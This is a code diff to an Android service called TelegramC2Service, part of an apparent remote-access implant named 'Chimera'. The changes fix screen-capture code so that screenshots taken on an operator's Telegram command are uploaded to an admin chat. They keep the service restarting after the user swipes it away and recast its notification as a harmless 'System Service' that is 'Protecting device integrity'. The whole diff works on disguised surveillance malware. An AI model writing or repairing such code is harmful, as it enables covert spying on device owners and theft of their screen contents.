@@ -55,6 +55,7 @@ public class TelegramC2Service extends Service {
 
         projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
         createNotificationChannel();
+        // Start as a general foreground service
         startForeground(NOTIFICATION_ID, createNotification());
 
         startWorker();
@@ -68,26 +69,19 @@ public class TelegramC2Service extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null && intent.getAction() != null) {
             String action = intent.getAction();
-            switch (action) {
-                case "ACTION_PREPARE_SCREENSHOT":
-                    // This action is triggered by the Telegram bot. It starts the transparent activity.
-                    Intent activityIntent = new Intent(this, ScreenshotActivity.class);
-                    activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(activityIntent);
-                    break;
-                case "ACTION_SCREENSHOT_RESULT":
-                    // This action is triggered by ScreenshotActivity after the user responds to the prompt.
-                    int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
-                    Intent resultData = intent.getParcelableExtra("resultData");
+            if ("ACTION_PREPARE_SCREENSHOT".equals(action)) {
+                Intent activityIntent = new Intent(this, ScreenshotActivity.class);
+                activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(activityIntent);
+            } else if ("ACTION_SCREENSHOT_RESULT".equals(action)) {
+                int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
+                Intent resultData = intent.getParcelableExtra("resultData");
 
-                    if (resultCode == Activity.RESULT_OK && resultData != null) {
-                        // Permission was granted. Start the capture.
-                        handleScreenshotResult(resultCode, resultData);
-                    } else {
-                        // Permission was denied. Inform the operator.
-                        TelegramBotWorker.sendMessage("Screenshot permission was denied.", this);
-                    }
-                    break;
+                if (resultCode == Activity.RESULT_OK && resultData != null) {
+                    handleScreenshotResult(resultCode, resultData);
+                } else {
+                    TelegramBotWorker.sendMessage("Screenshot permission was denied.", this);
+                }
             }
         }
         return START_STICKY;
@@ -95,14 +89,15 @@ public class TelegramC2Service extends Service {
 
     private void handleScreenshotResult(int resultCode, Intent data) {
         try {
-            // Required for Android Q and above to run MediaProjection from a service
+            // FIXED: Promote the service to a 'mediaProjection' type foreground service
+            // BEFORE starting the screen capture. This is mandatory on Android 10+
+            // and resolves the SecurityException crash.
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
             }
 
             mediaProjection = projectionManager.getMediaProjection(resultCode, data);
             if (mediaProjection != null) {
-                // Set a callback to clean up when the projection session ends
                 mediaProjection.registerCallback(new MediaProjection.Callback() {
                     @Override
                     public void onStop() {
@@ -136,7 +131,6 @@ public class TelegramC2Service extends Service {
                     imageReader.getSurface(), null, screenshotHandler
             );
 
-            // Add a small delay to ensure the display is ready before capturing
             screenshotHandler.postDelayed(() -> {
                 Image image = null;
                 try {
@@ -150,10 +144,8 @@ public class TelegramC2Service extends Service {
 
                         Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                         bitmap.copyPixelsFromBuffer(buffer);
-
-                        // We might need to crop the padding
                         Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
-                        bitmap.recycle(); // recycle the original
+                        bitmap.recycle();
 
                         File outputFile = new File(getExternalFilesDir(null), "screenshot.jpg");
                         try (FileOutputStream fos = new FileOutputStream(outputFile)) {
@@ -162,7 +154,6 @@ public class TelegramC2Service extends Service {
                         croppedBitmap.recycle();
 
                         TelegramBotWorker.uploadFile(outputFile.getAbsolutePath(), ConfigLoader.getAdminId(), "Screenshot", this);
-
                     } else {
                          TelegramBotWorker.sendMessage("Failed to acquire image for screenshot.", this);
                     }
@@ -171,10 +162,9 @@ public class TelegramC2Service extends Service {
                     TelegramBotWorker.sendMessage("Exception during screenshot capture: " + e.getMessage(), this);
                 } finally {
                     if (image != null) image.close();
-                    // IMPORTANT: Stop the projection immediately after capture to release resources
                     stopScreenshot();
                 }
-            }, 300); // 300ms delay
+            }, 300);
 
         } catch (Exception e) {
             ErrorLogger.logError(this, "captureScreenshotSetup", e);
@@ -184,7 +174,6 @@ public class TelegramC2Service extends Service {
     }
 
     private void stopScreenshot() {
-        // Release all projection resources
         if (virtualDisplay != null) {
             virtualDisplay.release();
             virtualDisplay = null;
@@ -199,35 +188,24 @@ public class TelegramC2Service extends Service {
         }
     }
 
-    // --- Service Lifecycle and Worker Management ---
-
     private void startWorker() {
-        try {
-            if (workerThread == null || !workerThread.isAlive()) {
-                workerThread = new Thread(new TelegramBotWorker(this));
-                workerThread.start();
-            }
-        } catch (Exception e) {
-            ErrorLogger.logError(this, "TelegramC2Service_StartWorker", e);
+        if (workerThread == null || !workerThread.isAlive()) {
+            workerThread = new Thread(new TelegramBotWorker(this));
+            workerThread.start();
         }
     }
 
     private void sendInstallMessage() {
-        String installMessage = "Chimera installed and running on device: " + Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
+        String installMessage = "Chimera installed: " + Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
         TelegramBotWorker.sendMessage(installMessage, this);
     }
 
-
     @Override
     public void onDestroy() {
-        try {
-            if (workerThread != null) workerThread.interrupt();
-            if (screenshotThread != null) screenshotThread.quitSafely();
-            stopScreenshot();
-        } catch (Exception e) {
-            ErrorLogger.logError(this, "TelegramC2Service_OnDestroy", e);
-        }
         super.onDestroy();
+        if (workerThread != null) workerThread.interrupt();
+        if (screenshotThread != null) screenshotThread.quitSafely();
+        stopScreenshot();
     }
 
     @Override
@@ -235,36 +213,26 @@ public class TelegramC2Service extends Service {
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        // This ensures the service restarts if the app is swiped away from recent apps
-        try {
-            Intent restartIntent = new Intent(getApplicationContext(), this.getClass());
-            restartIntent.setPackage(getPackageName());
-            PendingIntent pi = PendingIntent.getService(getApplicationContext(), 1, restartIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
-            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-            am.set(AlarmManager.ELAPSED_REALTIME, System.currentTimeMillis() + 1000, pi);
-        } catch (Exception e) {
-            ErrorLogger.logError(this, "TelegramC2Service_OnTaskRemoved", e);
-        }
         super.onTaskRemoved(rootIntent);
+        Intent restartIntent = new Intent(getApplicationContext(), this.getClass());
+        restartIntent.setPackage(getPackageName());
+        PendingIntent pi = PendingIntent.getService(getApplicationContext(), 1, restartIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
+        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        am.set(AlarmManager.ELAPSED_REALTIME, System.currentTimeMillis() + 1000, pi);
     }
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription("Required for background operations.");
             getSystemService(NotificationManager.class).createNotificationChannel(channel);
         }
     }
 
     private Notification createNotification() {
-        Intent notificationIntent = new Intent(this, MainActivity.class);
-        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
-
         return new Notification.Builder(this, CHANNEL_ID)
-                .setContentTitle("System Integrity Service")
-                .setContentText("Monitoring device status.")
-                .setSmallIcon(R.drawable.ic_launcher_foreground) // Use your app's icon
-                .setContentIntent(pendingIntent)
+                .setContentTitle("System Service")
+                .setContentText("Protecting device integrity.")
+                .setSmallIcon(android.R.drawable.ic_lock_lock)
                 .build();
     }
 }
